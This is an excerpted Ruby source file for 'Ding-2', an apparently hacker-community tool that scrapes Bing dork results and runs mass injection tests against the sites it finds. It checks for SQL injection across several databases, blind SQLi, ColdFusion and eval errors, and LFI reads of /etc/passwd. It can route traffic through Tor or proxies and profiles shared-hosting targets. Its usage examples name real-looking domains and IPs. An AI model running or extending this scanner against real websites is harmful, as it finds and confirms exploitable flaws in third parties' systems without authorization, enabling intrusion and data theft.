...
# Designed with Ruby 1.9 in mind
# By: MrGreen & Hood3dRob1n
#
# Thanx to SquirmyBeast & Affine for fun ideas and shooting the shit with me & keeping motivated while i work out the kinks
# Greetz & Shouts to the entire Z+ Community
# Enjoi World!
...
class Banner
	def print
		...
		puts
		puts "Ding-2".light_blue + ":".white + " A Faster Bing Dork Scanner".light_blue
		puts "\tBy: ".light_blue + "MrGreen".light_green
		puts
	end
end
...
class InjectorTest
			...
			if @@tor == 'fuqya' #TOR Returns our response as a string whereas open-uri returns our response as an array so we need to handle slightly different...............>
				...
				if response =~ /#{lfi}/
					if tracker < 1
						...
						vlinks = File.new("results/lfi.results", "a+")  #Open our file handle
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{cold}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/coldfusion.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{lqsym}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/mysqli.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{lqssm}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/mssqli.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{lqsasm}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/msaccess.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{lqspg}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/pgsqli.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{ora}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/oracle.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{misc}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/misc.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
			...
			if @@tor == 'fuqya'
				...
				if response =~ /#{evalz}/
					if tracker < 1
						...
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("results/eval.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
	...
	def quoteTest(num) #1=Single Dork, 2=File Option (threads?)
		puts "Commencing Injection Tests".light_red + "....".cyan
		File.open("results/ding2.results", "r").each do |line|
			...
			begin
				...
				puts "Testing Link".light_red + ": ".cyan + "#{line.chomp}".white
				count=0
				tracker=0
	...
	def etcTest(num) #1=Single Dork, 2=File Option (threads?) #Am i using num var anymore??
		puts "Commencing /etc/passwd LFI Injection Test now".light_red + "....".cyan
		File.open("results/ding2.results", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
				...
				params.each do |key, value| #cycle through hash and print key and associated value
					...
					if params.length > 1 #Multiple Parameter Links
						...
						if @@tor == 'fuqya'
							...
							if vchk =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/m
								puts "Link: ".light_green + "#{injlnk.chomp}".white
								puts "File Found: ".light_green + "/etc/passwd".white
								passwdz = $1
								puts "#{passwdz}".cyan
								puts
								vlinks = File.new("results/lfi-confirmed.results", "a+")  #Open our file handle
						...
						if tracker.to_i == 0
							...
							puts "#{passwdz.join("\n")}".cyan
							puts
							vlinks = File.new("results/lfi-confirmed.results", "a+") 
							vlinks.puts "#{@injlnk}"
							vlinks.close
						end
	...
	def blindTest(num) #1=Single Dork, 2=File Option
		puts "Commencing Blind Injection Tests".light_red + "....".cyan
		File.open("results/ding2.results", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
				...
				params.each do |key, value| #cycle through hash and print key and associated value
					...
					if params.length > 1 #Multiple Parameter Links
						...
						if truerez.length != falserez.length
							...
							vlinks = File.new("results/sql-blind.results", "a+") 
...
class BingSearch
	def searchq(dork, geocode, num, ip) #dork = dork, geocode = country code domain type to search in, num=1 then write, num=2 append, ip to use with dork or nil if not needed
		...
		while count.to_i <= 225 do #Set while loop so we can grab ~20 pages of results
			...
			begin
				...
				if num.to_i == 1
					print "\r" + "Number of Links Found: ".light_blue + "#{links.length}".white 
				end
		...
		if num.to_i == 1
			results = File.open("results/ding2.results", "w+")  #Open our file handle
		else
			results = File.open("results/ding2.results", "a+")  #Open our file handle
		end
	...
	def sharedHosting(shared)
		...
		if @@tor == 'fuqya'
			#TOR Request
			baseurl = URI(alexa)
			doc = Hpricot(Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body)
		else
			if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
				#RUN NORMAL REQUEST
				doc = Hpricot(open(alexa, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'})) # grab page and store in variable for parsing
			else
				if @@username == 'nada'
					#RUN PROXY WITHOUT AUTH
					doc = Hpricot(open(alexa, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy => "#{@@proxy}"}))
				else
					#RUN PROXY WITH AUTH
					doc = Hpricot(open(alexa, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}))
				end
			end
		end
		...
		puts "RECON RESULTS:".light_blue
		puts "Domain: ".light_red + "#{domainName}".white #Domain Name
		puts "Hostname: ".light_red + "#{hostname}".white #Hostname
		puts "Main IP: ".light_red + "#{ip}".white #Main IP Domain resolves to
		puts rank.light_red + " #{ranking}".white # Alexa Ranking
		...
		ips = Resolv.each_address(domainName) do |x| 
			puts "IP #{i+=1}: ".light_red + "#{x}".white #print ip and increment counter to keep unique
		end
		puts
		# Check for any MX or Mail Server records on target domain
		puts "MX Records Found: ".light_blue
		...
		Resolv::DNS.open do |dns| #Create DNS Resolv object
			...
			mail_servers.each do |mailsrv| # Create loop so we can print the MX results found w/ record preference
				puts "MX Server #{i+=1}: ".light_red + "#{mailsrv.exchange.to_s}".white + " - ".cyan + "#{mailsrv.preference}".white
			end
		end
		puts
		...
		if @@tor == 'fuqya'
			...
			doc = Hpricot(Tor::HTTP.get(baseurl.host, redirectedto, baseurl.port).body)
		else
			if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
				#RUN NORMAL REQUEST
				doc = Hpricot(open(sameip, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'})) # grab page and store in variable for parsing
			else
				if @@username == 'nada'
					#RUN PROXY WITHOUT AUTH
					doc = Hpricot(open(sameip, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy => "#{@@proxy}"}))
				else
					#RUN PROXY WITH AUTH
					doc = Hpricot(open(sameip, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}))
				end
			end
		end
		foo=[] #prep array
		...
		puts "Found ".light_red + "#{foo.length}".white + " Sites hosted on Server at: ".light_red + "#{ip}".white #use array length to determine how many sites there are
		...
		puts
		puts "Shared Hosting Check Complete! Hope you found what you needed".light_blue + "............".cyan
		puts
...
optparse = OptionParser.new do |opts|
	...
	opts.separator ""
	opts.separator "EX:".light_blue + " #{$0} -d \".php?id=\" ".white
	opts.separator "EX:".light_blue + " #{$0} -d \".php?id=\" -T".white
	opts.separator "EX:".light_blue + " #{$0} -d \".php?id=\" -c EDU -X http://127.0.0.1:8080".white
	opts.separator "EX:".light_blue + " #{$0} --dork \".php?id=\" -i 83.149.121.142".white
	opts.separator "EX:".light_blue + " #{$0} --dork \".php?id=\" -i 83.149.121.142 --tor".white
	opts.separator "EX:".light_blue + " #{$0} -f ~/dorks/lfi.lst --country-code AU --proxy http://somecoolsite.com:8080".white
	opts.separator "EX:".light_blue + " #{$0} -f ~/dorks/sharedhosting.lst --ip-address 83.223.106.11".white
	opts.separator "EX:".light_blue + " #{$0} --file /home/hood3drob1n/Desktop/ding/dorks/php-mini.lst".white
	opts.separator "EX:".light_blue + " #{$0} -s anko.nl".white
	opts.separator "EX:".light_blue + " #{$0} -s 83.223.106.11".white
	opts.separator "EX:".light_blue + " #{$0} --shared-hosting lavandula.com.au --tor".white
	opts.separator "EX:".light_blue + " #{$0} --shared-hosting http://holidayhomesindonegal.com".white
	opts.separator "EX:".light_blue + " #{$0} -f dorks/german.lst --country-code DE --proxy http://somecoolsite.com:8080 -U proxy_guest -P proxy_guest_pass".white
	opts.separator ""
	...
	opts.on('-R', '--clean-results', "\n\tRemove duplicate entries from Ding results files".white) do |cleaner|
		...
		foobanner.print
		puts "Running duplicates remover cleanup script for all results files".light_blue + ".....".white
		Dir.foreach("results/") do |x|
			if not x == "." and not x == ".." and not x == "ding2.results"
				if not File.directory?("results/#{x}")
					puts "Cleaning up ".light_red + "#{x}".white + ".....".cyan
					logcleaner(x)
				end
			end
		end
		puts
		puts "Results files all updated".light_green + "!".white
		puts
		puts
		exit 69;
	end
...
if options[:method] == 1
	if options[:proxy] == 1
		puts "Proxy Support has been enabled".light_blue + "!".white
	end
	puts "Making a Single dork run".light_blue + ".......".cyan
	...
	puts "Total Number of Unique Testable Links Found: ".light_blue + "#{rescount.length}".white
	...
	puts "Mass dorking with file option".light_blue + ".......".cyan
	FileUtils.rm('results/ding2.results') if File.exists?('results/ding2.results') #remove results file if it exists as we use append mode for file search to keep track of all results
	...
	File.open(options[:file], "r").each do |mass_dork|
		thread = Thread.new do #yeah threads, much faster now!!!!!!!!!!!!!!!!!!
			...
			mutex.synchronize do #so they all do it in sync and not all whacky. We should really wrap this whole thread subsection including the search calls but it slows things down like crazy and so far I have not seen any side affects of not using Mutex (results same using vs not, with difference being significant time savings). Enjoy or re-write it and show me another way thats not so slow :p
				puts "Checking Bing using ".light_blue + "'".cyan + "#{dork}".white + "'".cyan + " hang tight".light_blue + "....".cyan
			end
	...
	puts "Checking for Shared Hosting".light_blue + "......".cyan
	puts
	foosearch = BingSearch.new
